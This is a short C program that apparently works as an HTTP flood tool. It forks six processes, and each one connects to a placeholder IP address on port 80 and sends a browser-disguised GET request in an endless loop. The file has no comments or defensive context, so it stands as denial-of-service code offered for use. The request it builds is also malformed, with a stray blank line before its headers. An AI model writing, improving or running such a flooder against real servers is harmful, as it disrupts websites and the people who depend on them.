#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define THREADS 5
#define MSGSIZE 2048
#define BUFSIZE (MSGSIZE + 1)

int main(int argc, char* argv[]) {

    int i;
    int sock;
    struct sockaddr_in servSockAddr;
    unsigned short servPort;
    char sendBuffer[BUFSIZE] = "GET / HTTP/1.1\nHost: XXX.XXX.XX.XX\n\n User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nKeep-Alive: 115\nConnection: keep-alive";

    for (i = 0; i < THREADS; ++i)
    {
        if (fork() == 0) break;
    }

    memset(&servSockAddr, 0, sizeof(servSockAddr));

    servSockAddr.sin_family = AF_INET;

    inet_aton("XXX.XXX.XX.XX", &servSockAddr.sin_addr);

    servPort = (unsigned short) atoi("80");
    servSockAddr.sin_port = htons(servPort);

    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    connect(sock, (struct sockaddr*) &servSockAddr, sizeof(servSockAddr));
    printf("connect to %s\n", inet_ntoa(servSockAddr.sin_addr));

    while(1)
    {
        send(sock, sendBuffer, strlen(sendBuffer), 0);
    }

    return EXIT_SUCCESS;
}